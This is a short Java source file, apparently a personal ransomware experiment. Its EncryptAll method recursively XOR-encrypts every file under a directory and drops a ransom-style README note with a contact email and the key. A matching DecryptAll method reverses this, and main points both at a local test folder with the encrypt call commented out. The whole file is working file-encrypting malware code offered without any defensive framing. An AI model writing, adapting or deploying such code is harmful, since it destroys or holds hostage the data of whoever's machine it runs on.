import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;


public class ransom{
    public static void EncryptAll(String path, String key){
        Path dirPath = Paths.get(path);
        try (Stream<Path> paths = Files.list(dirPath)) {
            System.out.println("Files:");
            paths.forEach(file -> {
                if (Files.isRegularFile(file)) {
                    xorEncryptClass.encryptFile(file.toString(), key);
                }});
            File file = new File(dirPath.toString()+"\\(rewar)ReadME.txt");
            FileWriter writer = new FileWriter(file);
            writer.write("Hello, Your all files are encrypted. don't be panic if it is accidentally just email:prashantrewar1311@gmail.com if you need any help. Your key is: "+key);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try (Stream<Path> directories = Files.list(dirPath).filter(Files::isDirectory);){
            directories.forEach(dir->{
                EncryptAll(path + "\\" + dir.getFileName(), key);
            });
}
        catch (IOException e) {
            e.printStackTrace();
        }
}
public static void DecryptAll(String path, String key){
    Path dirPath = Paths.get(path);
    try (Stream<Path> paths = Files.list(dirPath)) {
        System.out.println("Folder: ");
        paths.forEach(file -> {
            if (Files.isRegularFile(file)) {
                xorEncryptClass.decryptFile(file.toString(), key);
            }});
    } catch (IOException e) {
        e.printStackTrace();
    }
    try (Stream<Path> directories = Files.list(dirPath).filter(Files::isDirectory);){
        directories.forEach(dir->{
            DecryptAll(path + "\\" + dir.getFileName(), key);
        });
}
    catch (IOException e) {
        e.printStackTrace();
    }
}
    public static void main(String[] args){
        String path = "C:\\Users\\prash\\AppData\\Local\\test";
        String key = "secret";
        // EncryptAll(path,key);
        DecryptAll(path,key);
    }
}